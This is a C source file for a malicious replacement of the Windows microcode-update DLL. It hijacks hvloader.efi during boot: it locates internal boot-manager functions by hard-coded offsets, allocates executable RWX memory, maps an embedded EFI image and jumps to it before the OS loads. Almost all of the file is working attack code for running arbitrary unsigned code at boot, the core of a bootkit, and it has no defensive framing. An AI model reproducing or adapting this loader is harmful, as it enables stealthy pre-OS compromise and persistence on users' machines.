#include <windows.h>
#include <winternl.h>

#define EFIAPI				__cdecl

#define MEMCPY(Dest, Src, Length)	for(UINT64 i = 0; i < (Length); i++) Dest[i] = Src[i];

//Defines taken from https://github.com/btbd/umap/
#define BL_MEMORY_TYPE_APPLICATION  (0xE0000012)
#define BL_MEMORY_ATTRIBUTE_RWX     (0x424000)

typedef enum E_EXECUTION_CONTEXT
{
	ApplicationContext,
	FirmwareContext
}EXECUTION_CONTEXT, *PEXECUTION_CONTEXT;

typedef DWORD64 EFI_STATUS;

typedef void(EFIAPI *BLP_ARCH_SWITCH_CONTEXT)(EXECUTION_CONTEXT newContext);
typedef NTSTATUS(EFIAPI *BL_IMG_ALLOCATE_IMAGE_BUFFER)(PVOID *imageBuffer, INT64 imageSize, INT32 memoryType, INT32 attributes, INT32 unused, BOOLEAN flags);
typedef EFI_STATUS(EFIAPI *BOOT_ENTRY)(PVOID imageHandle, PVOID systemTable, BLP_ARCH_SWITCH_CONTEXT fpBlpArchSwitchContext);

//This buffer contains the unmapped EFI image we want to run. The code below assumes that this image has no relocations (use subsystem EFI_APPLICATION).
BYTE efiApp[] = { 0x4D, 0x5A };

//Entry point for mcupdate_*.dll
DWORD McUpdateEntry(PVOID *functionTableOut, PVOID *functionTableIn)
{
	BOOT_ENTRY entry;
	BL_IMG_ALLOCATE_IMAGE_BUFFER fpBlImgAllocateImageBuffer;
	BLP_ARCH_SWITCH_CONTEXT fpBlpArchSwitchContext;
	PIMAGE_DOS_HEADER hvDosHeader, efiDosHeader = (PIMAGE_DOS_HEADER)efiApp;
	PIMAGE_NT_HEADERS hvNtHeaders, efiNtHeaders = (PIMAGE_NT_HEADERS)(efiApp + efiDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER secHeader, section;
	PBYTE imageBuffer = NULL, src, dest;
	PVOID hvLoaderAddr, printProc, hvLoaderBase = NULL, efiSystemTable, efiImageHandle;
	DWORD64 imageSize = efiNtHeaders->OptionalHeader.SizeOfImage;

	//1. Get EFI system table, image handle and the start addresses of BlpArchSwitchContext, BlImgAllocateImageBuffer by offset from hvloader.efi  

	hvLoaderAddr = functionTableIn[3];				//This contains an address within hvloader.efi
	printProc = (PVOID)((DWORD_PTR)hvLoaderAddr + 0xAE48);		//This can be used to print text from application context

	for (PBYTE searchAddr = printProc; searchAddr; searchAddr--)	//Search for the nearest MZ header (which is guaranteed to belong to hvloader.efi).
	{
		if (searchAddr[0] == 'M' && searchAddr[1] == 'Z' && searchAddr[2] == 0x90 && searchAddr[4] == 0x03)
		{
			hvLoaderBase = searchAddr;
			break;
		}
	}

	if (!hvLoaderBase)
		goto Done;

	hvDosHeader = (PIMAGE_DOS_HEADER)hvLoaderBase;
	hvNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hvLoaderBase + hvDosHeader->e_lfanew);

	if (hvNtHeaders->OptionalHeader.CheckSum != 0xEC35E)		//It's better to have one check too much than too few
		goto Done;

	fpBlImgAllocateImageBuffer = (BL_IMG_ALLOCATE_IMAGE_BUFFER)((DWORD_PTR)hvLoaderBase + 0x3CC0C);
	fpBlpArchSwitchContext = (PVOID)((DWORD_PTR)hvLoaderBase + 0xC550);

	efiImageHandle = *(PVOID *)((DWORD_PTR)hvLoaderBase + 0x113670);
	efiSystemTable = *(PVOID *)((DWORD_PTR)hvLoaderBase + 0x1136C8);

	//2. Allocate 1:1 PA-VA buffer
	if (!NT_SUCCESS(fpBlImgAllocateImageBuffer(&imageBuffer, imageSize, BL_MEMORY_TYPE_APPLICATION, BL_MEMORY_ATTRIBUTE_RWX, 0, 0b00000001)))
		goto Done;

	if (!imageBuffer)
		goto Done;

	//3. Copy headers
	MEMCPY(imageBuffer, efiApp, efiNtHeaders->OptionalHeader.SizeOfHeaders);

	//4. Map sections
	secHeader = (PIMAGE_SECTION_HEADER)((UINT64)&efiNtHeaders->OptionalHeader + efiNtHeaders->FileHeader.SizeOfOptionalHeader);

	for (WORD i = 0; i < efiNtHeaders->FileHeader.NumberOfSections; i++)
	{
		section = &secHeader[i];

		if (section->SizeOfRawData)
		{
			dest = (PVOID)(imageBuffer + section->VirtualAddress);
			src = (PVOID)(efiApp + section->PointerToRawData);

			MEMCPY(dest, src, section->SizeOfRawData);
		}
	}

	//5. Call entry point
	if (efiNtHeaders->OptionalHeader.AddressOfEntryPoint)
	{
		/*
		* We use a custom entry point to pass the address of BlpArchSwitchContext to our EFI application.
		* Before it can call EFI services, it needs to call BlpArchSwitchContext with 'FirmwareContext' as argument (and revert this before returning).
		*/

		entry = (BOOT_ENTRY)(imageBuffer + efiNtHeaders->OptionalHeader.AddressOfEntryPoint);
		entry(efiImageHandle, efiSystemTable, fpBlpArchSwitchContext);							
	}

Done:

	while (1);		//We don't want to return to the calling boot application

	return 0;
}
